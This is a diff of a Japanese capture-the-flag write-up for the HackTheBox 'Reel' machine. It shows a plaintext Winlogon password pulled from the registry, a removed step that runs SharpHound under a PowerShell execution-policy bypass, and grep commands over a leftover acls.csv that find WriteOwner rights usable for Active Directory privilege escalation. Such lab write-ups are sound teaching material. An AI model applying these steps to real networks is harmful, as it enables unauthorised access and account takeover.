@@ -192,13 +192,51 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     DefaultPassword    REG_SZ    4dri@na2017!**
 ```
 
-ありがたいことに、最初からC:\Users\tom\Desktop\AD Audit\BloodHound\IngestorsにSharpHoundが用意されていた。
-しかしGroupPolicyによりうまく実行できない。
-
-そこで以下のようにExecutionPolicyを指定してPowerShellを起動しSharpHound.ps1を実行する：
+# Claire's shell
 
 ```
-tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell -ep Bypass
-PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> . .\SharpHound.ps1
-PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir /a                                                              
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is CC8A-33E1                                                                                              
+
+ Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                                
+
+05/29/2018  07:57 PM    <DIR>          .                                                                                        
+05/29/2018  07:57 PM    <DIR>          ..                                                                                       
+11/16/2017  11:50 PM           112,225 acls.csv                                                                                 
+10/28/2017  08:50 PM             3,549 BloodHound.bin                                                                           
+10/24/2017  03:27 PM           246,489 BloodHound_Old.ps1                                                                       
+10/24/2017  03:27 PM           568,832 SharpHound.exe                                                                           
+10/24/2017  03:27 PM           636,959 SharpHound.ps1
 ```
+
+SharpHoundがうまく動かなかった。
+
+でも実は動かす必要ない。**acls.csv**というファイルは、各ADのユーザが他のユーザ・グループとどんな関係にあるか？などの情報を含んでいる大切なファイル。
+
+これがあることを怪しんでこのファイルをじっくり見てみる。
+
+libreofficeで開くと各ユーザは何ができるか？（WriteDaclとかGenericAllとか）が書いてあるとわかる。
+
+そこで次のようにコマンドを駆使して調べる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
+└─$ grep USER acls.csv | cut -d , -f 6 | sort | uniq -c
+     10 "ExtendedRight"
+    126 "GenericAll"
+     21 "Owner"
+     38 "WriteDacl WriteOwner"
+     23 "WriteDacl"
+      2 "WriteOwner"
+     10 "WriteProperty"
+ ```
+ グループでなくユーザについて出現回数の少ない権限に注目する。
+ 
+ ```
+┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
+└─$ grep USER acls.csv  | grep "WriteOwner"  | grep -v "WriteDacl"
+"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
+"herman@HTB.LOCAL","USER","","nico@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
+```
+
